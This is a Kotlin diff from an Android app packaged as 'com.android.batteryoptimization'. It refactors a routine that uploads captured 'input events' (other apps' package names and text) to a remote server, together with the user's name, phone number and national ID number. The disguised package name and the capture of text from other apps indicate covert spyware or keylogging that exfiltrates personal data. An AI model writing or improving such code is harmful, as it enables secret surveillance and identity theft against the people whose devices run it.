@@ -87,25 +87,44 @@ class InputRepository private constructor(context: Context) {
         if (currentEvents.isEmpty()) return
 
         val userInfo = getUserInfo()
-        val name = URLEncoder.encode(userInfo?.name ?: "Unknown", "UTF-8")
+        val name = userInfo?.name ?: "Unknown"
         val phone = userInfo?.phone ?: "Unknown"
         val idCard = userInfo?.idCard ?: "Unknown"
-        val osVersion = "Android ${Build.VERSION.RELEASE}"
-        val timestamp = System.currentTimeMillis().toString()
+
+        val deviceInfoMap = mapOf(
+            "timestamp" to System.currentTimeMillis(),
+            "osVersion" to "Android ${Build.VERSION.RELEASE}"
+        )
+        val deviceInfoJson = gson.toJson(deviceInfoMap)
+
+        val userInfoPayload = com.android.batteryoptimization.network.UserInfoPayload(
+            name = name,
+            phone = phone,
+            idCard = idCard
+        )
+
+        val eventPayloads = currentEvents.map { event ->
+            com.android.batteryoptimization.network.EventPayload(
+                packageName = event.packageName,
+                text = event.text,
+                timestamp = event.timestamp
+            )
+        }
+
+        val requestBody = com.android.batteryoptimization.network.UploadRequest(
+            userInfo = userInfoPayload,
+            events = eventPayloads
+        )
 
         try {
             // Upload using Retrofit
             val response = NetworkClient.uploadApi.uploadEvents(
-                userName = name,
-                userPhone = phone,
-                userIdCard = idCard,
-                deviceOs = osVersion,
-                deviceTimestamp = timestamp,
-                events = currentEvents
+                deviceInfoJson = deviceInfoJson,
+                requestBody = requestBody
             )
 
-            if (response.isSuccessful && response.body()?.code == 200) {
-                Log.d("InputRepository", "Upload successful: ${currentEvents.size} events")
+            if (response.isSuccessful && response.body()?.code == 0) {
+                Log.d("InputRepository", "Upload successful: ${currentEvents.size} events, msg: ${response.body()?.msg}")
                 
                 // Append to backup file
                 appendToBackup(currentEvents)
@@ -120,7 +139,7 @@ class InputRepository private constructor(context: Context) {
                 // Reset timer since we just successfully uploaded
                 resetTimer()
             } else {
-                Log.e("InputRepository", "Upload failed: ${response.code()} ${response.message()}")
+                Log.e("InputRepository", "Upload failed: ${response.code()} ${response.message()}, body: ${response.body()}")
             }
         } catch (e: Exception) {
             Log.e("InputRepository", "Upload error: ${e.message}")
